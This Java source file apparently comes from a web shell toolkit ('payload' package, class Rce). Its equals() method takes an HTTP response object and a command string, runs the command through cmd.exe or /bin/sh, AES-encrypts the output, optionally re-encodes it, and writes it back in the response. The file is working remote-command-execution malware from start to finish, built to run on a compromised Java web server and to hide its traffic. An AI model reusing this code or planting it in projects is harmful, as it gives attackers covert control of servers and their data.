package org.b1ackc4t.payload.java;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.lang.reflect.Method;
import java.math.BigInteger;
import java.nio.charset.Charset;
import java.util.Base64;
import java.util.List;


public class Rce {
   public static String cmd;
   private Object res;
   public static String key;
   public static int encode;

   public boolean equals(Object obj) {
      ByteArrayOutputStream bos = new ByteArrayOutputStream();
      Object o;
      Method m;
      try {
         fill(obj);
         bos.write("1@".getBytes());
         bos.write(rce(cmd).getBytes());
      } catch (Exception e) {
         try {
            bos.reset();
            bos.write("0@".getBytes());
         } catch (Exception r) {
         }
      }

      try {
         o = res.getClass().getMethod("getOutputStream").invoke(res);
         m = o.getClass().getMethod("write", byte[].class);
         byte[] r = encrypt(bos.toByteArray());
         bos.close();
         switch (encode) {
            case 0:
               break;
            case 1:
               r = new BigInteger(r).toString(16).getBytes();
               break;
            case 2:
               r = new BigInteger(r).toString(36).getBytes();
               break;
            default:
               if (System.getProperty("java.version").compareTo("1.8") >= 0) {
                  r = Base64.getEncoder().encode(r);
               } else {
                  r = new sun.misc.BASE64Encoder().encode(r).getBytes();
               }
         }
         m.invoke(o, r);
         o.getClass().getMethod("flush").invoke(o);
         o.getClass().getMethod("close").invoke(o);
//            Response.getOutputStream().write(this.Encrypt(bos.toByteArray()));
//            Response.getOutputStream().flush();
//            Response.getOutputStream().close();
      } catch (Exception e) {
      }

      return true;
   }

   private String rce(String cmd) throws Exception {
      String r = null;
      if (cmd != null && cmd.length() > 0) {
         Process p;
         if (System.getProperty("os.name").toLowerCase().indexOf("windows") >= 0) {
            p = Runtime.getRuntime().exec(new String[]{"cmd.exe", "/c", cmd});
         } else {
            p = Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", cmd});
         }
         ByteArrayOutputStream bos = new ByteArrayOutputStream();
         InputStream is = p.getInputStream();
         byte[] tmp = new byte[2048];
         int len;
         while ((len = is.read(tmp)) != -1) {
            bos.write(tmp, 0, len);
         }
         r = new String(bos.toByteArray(), Charset.forName(System.getProperty("sun.jnu.encoding")));
         bos.close();
      }
      return r;
   }

   private byte[] encrypt(byte[] bs) throws Exception {
      Cipher c = Cipher.getInstance("AES/ECB/PKCS5Padding");
      c.init(1, new SecretKeySpec(key.getBytes("utf-8"), "AES"));
      return c.doFinal(bs);
   }

   private void fill(Object obj) throws Exception {
      List<Object> p = (List)obj;
      res = p.get(0);
      if (p.size() > 1) {
         cmd = (String) p.get(1);
      }
      res.getClass().getMethod("setCharacterEncoding", String.class).invoke(res, "UTF-8");
   }
}
